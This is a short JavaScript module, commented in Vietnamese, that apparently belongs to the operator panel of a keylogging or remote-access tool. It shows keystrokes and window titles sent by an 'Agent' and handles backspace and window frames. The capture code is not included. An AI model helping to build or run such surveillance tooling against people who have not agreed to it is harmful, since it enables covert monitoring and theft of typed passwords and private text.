// =================================================================
// MODULE: KEYLOGGER
// Xử lý hiển thị và làm sạch log bàn phím
// =================================================================

import { $ } from '../core/utils.js';

// Lưu vị trí cuối cùng của khung [Window] - không cho phép xóa quá vị trí này
let lastWindowFrameEndIndex = 0;

export function handleKeyEvent(keyCode, keyChar) {
    const el = document.getElementById('keylog-output');
    if (!el) return;
    
    // 1. XỬ LÝ BACKSPACE TRƯỚC - ưu tiên cao nhất
    if (keyChar === '[BACKSPACE]') {
        // Chỉ cho phép xóa nếu độ dài hiện tại lớn hơn vị trí khung cuối cùng
        if (el.textContent.length > lastWindowFrameEndIndex) {
            el.textContent = el.textContent.slice(0, -1);
        }
        // Nếu không, bỏ qua backspace (không xóa khung)
        return;
    }
    
    // 2. Kiểm tra nếu đây là khung cửa sổ mới [ Window Name ]
    // Format từ Agent: "\n\n[ Window Title ]\n"
    // Khung cửa sổ có khoảng trắng sau [ và trước ] để phân biệt với [BACKSPACE]
    const windowFrameMatch = keyChar.match(/^\s*\[\s.+\s\]\s*$/);
    if (windowFrameMatch) {
        // Thêm khung cửa sổ (đã có newline từ Agent)
        el.textContent += keyChar;
        // Cập nhật vị trí giới hạn - không cho phép backspace xóa quá điểm này
        lastWindowFrameEndIndex = el.textContent.length;
        el.scrollTop = el.scrollHeight;
        return;
    }
    
    // 3. Xử lý các phím thông thường
    if (keyChar === '\n') el.textContent += '\n';
    else if (keyChar === '\t') el.textContent += '    ';
    else el.textContent += keyChar;
    
    el.scrollTop = el.scrollHeight;
}

// Reset vị trí khung khi clear keylog
export function resetWindowFrameIndex() {
    lastWindowFrameEndIndex = 0;
}